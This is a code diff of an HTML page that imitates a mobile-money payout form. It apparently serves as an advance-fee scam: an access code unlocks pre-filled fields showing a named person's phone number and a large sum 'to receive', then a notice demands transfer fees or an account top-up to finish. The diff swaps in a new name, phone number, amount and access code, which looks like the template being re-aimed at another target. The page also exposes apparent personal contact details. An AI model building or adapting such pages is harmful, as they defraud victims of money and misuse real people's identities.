@@ -177,17 +177,17 @@
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="Dossim Assang Michel" disabled />
+        <input type="text" id="name" value="Awa Coulibaly " disabled />
       </div>
 
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+228 90 05 47 68" disabled />
+        <input type="tel" id="phone" value="+223 478 69 49 88" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="1 148 000 F CFA" disabled />
+        <input type="text" id="amount" value="723 000 F CFA" disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,7 +202,7 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-        ⚠️ Veuillez payer les frais de transfert des fonds afin de terminer la transaction.
+        ⚠️ Veuillez recharger votre compte afin de terminer la transaction.
       </div>
     </form>
   </div>
@@ -212,7 +212,7 @@
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
 
-      if (code === "4768") {
+      if (code === "4988") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
